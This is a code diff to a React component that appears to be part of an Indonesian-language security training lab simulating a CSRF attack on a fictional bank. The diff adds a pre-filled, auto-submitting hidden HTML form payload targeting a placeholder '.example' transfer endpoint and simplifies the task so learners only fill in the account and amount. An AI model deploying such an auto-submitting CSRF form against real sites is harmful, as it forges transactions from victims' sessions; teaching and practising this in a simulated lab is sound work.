@@ -1,4 +1,4 @@
-// Save as: utils/Quiz/A01/lab3/csrf-transfer-simulator.tsx
+// Save as: utils/Quiz/A01/lab2/csrf-transfer-simulator.tsx
 "use client";
 
 import { useState, useTransition } from "react";
@@ -24,6 +24,19 @@ const FAILURE_HINTS: Record<CsrfTransferFailureReason, string> = {
     "Form kamu sudah benar isinya, tapi korban tidak akan pernah mengklik apapun. Form ini perlu ter-submit otomatis lewat script.",
 };
 
+// Scaffold awal: strukturnya sudah lengkap (form -> /transfer, auto-submit
+// lewat script), user cuma perlu mengganti dua nilai placeholder di bawah
+// jadi nilai yang benar sesuai skenario (target_account_attacker & amount).
+function buildStarterPayload(criteria: CsrfTransferCriteria): string {
+  return `<form id="csrf-form" action="https://${criteria.app_name.toLowerCase().replace(/\s+/g, "")}.example/transfer" method="POST">
+  <input type="hidden" name="to_account" value="GANTI_DENGAN_REKENING_TUJUAN">
+  <input type="hidden" name="amount" value="GANTI_DENGAN_JUMLAH">
+</form>
+<script>
+  document.getElementById('csrf-form').submit();
+</script>`;
+}
+
 export default function CsrfTransferSimulator({
   categoryId,
   exerciseId,
@@ -39,7 +52,7 @@ export default function CsrfTransferSimulator({
   onCountersUpdate: (c: ProgressCounters) => void;
   onReconsiderPrompt: () => void;
 }) {
-  const [payload, setPayload] = useState("");
+  const [payload, setPayload] = useState(() => buildStarterPayload(criteria));
   const [lastResult, setLastResult] = useState<Awaited<ReturnType<typeof attemptCsrfTransfer>> | null>(null);
   const [isPending, startTransition] = useTransition();
 
@@ -63,10 +76,11 @@ export default function CsrfTransferSimulator({
       <p className="mb-1 font-mono text-xs uppercase tracking-wider text-[#8B949E]">Simulasi — bukan sistem nyata</p>
       <h3 className="mb-4 text-lg font-medium text-[#E6EDF3]">{criteria.app_name} · Halaman Jahat Pihak Ketiga</h3>
       <p className="mb-3 text-xs text-[#8B949E]">
-        Sesi korban di {criteria.app_name} masih aktif. Tulis halaman HTML yang, begitu dibuka korban, otomatis
-        mengirim transfer dana ke rekening <code className="text-[#F0883E]">{criteria.target_account_attacker}</code>{" "}
-        sejumlah <code className="text-[#F0883E]">{criteria.transfer_amount}</code>, tanpa korban perlu mengklik
-        apapun.
+        Sesi korban di {criteria.app_name} masih aktif. Halaman di bawah sudah punya struktur dasarnya — kamu tinggal
+        ganti dua nilai placeholder supaya transfer dana ke rekening{" "}
+        <code className="text-[#F0883E]">{criteria.target_account_attacker}</code> sejumlah{" "}
+        <code className="text-[#F0883E]">{criteria.transfer_amount}</code> terkirim otomatis begitu korban membuka
+        halaman ini, tanpa perlu mengklik apapun.
       </p>
 
       <textarea
@@ -74,8 +88,16 @@ export default function CsrfTransferSimulator({
         onChange={(e) => setPayload(e.target.value)}
         rows={8}
         className="w-full rounded border border-[#21262D] bg-[#0D1117] px-3 py-2 font-mono text-xs text-[#C9D1D9] focus:border-[#F0883E]/50 focus:outline-none"
-        placeholder={`<form id="f" action="https://quickbank.example/transfer" method="POST">\n  <input type="hidden" name="to_account" value="...">\n  <input type="hidden" name="amount" value="...">\n</form>\n<script>document.getElementById('f').submit();</script>`}
       />
+
+      <div className="mt-2 flex justify-end">
+        <button
+          onClick={() => setPayload(buildStarterPayload(criteria))}
+          className="text-xs text-[#8B949E] underline hover:text-[#C9D1D9]"
+        >
+          Reset ke template awal
+        </button>
+      </div>
 
       <button
         onClick={submit}
